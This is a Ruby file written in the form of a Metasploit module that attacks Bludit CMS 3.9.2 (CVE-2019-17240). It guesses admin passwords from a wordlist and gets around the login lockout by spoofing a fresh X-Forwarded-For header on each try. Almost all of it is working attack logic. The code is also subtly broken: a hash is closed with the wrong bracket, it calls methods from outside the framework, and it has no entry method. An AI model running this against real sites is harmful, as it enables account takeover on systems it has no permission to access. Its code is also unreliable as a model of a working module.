##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        ],
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
        	File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end
  
  class WebAgent
    class Cookie < HTTP::Cookie
      def domain
        self.original_domain
      end
    end
  end

  def get_csrf(client, login_url)
    res = client.get(login_url)
    csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
  end

  def auth_ok?(res)
    HTTP::Status.redirect?(res.code) &&
      %r{/admin/dashboard}.match?(res.headers['Location'])
  end

  def bruteforce_auth(client, host, username, wordlist)
    login_url = host + '/admin/login'
    File.foreach(wordlist).with_index do |password, i|
      password = password.chomp
      csrf_token = get_csrf(client, login_url)
      headers = {
        'X-Forwarded-For' => "#{i}-#{password[..4]}",
      }
      data = {
        'tokenCSRF' => csrf_token,
        'username' => username,
        'password' => password,
      }
      puts "[*] Trying password: #{password}"
      auth_res = client.post(login_url, data, headers)
      if auth_ok?(auth_res)
        puts "\n[+] Password found: #{password}"
        break
      end
    end
  end
end
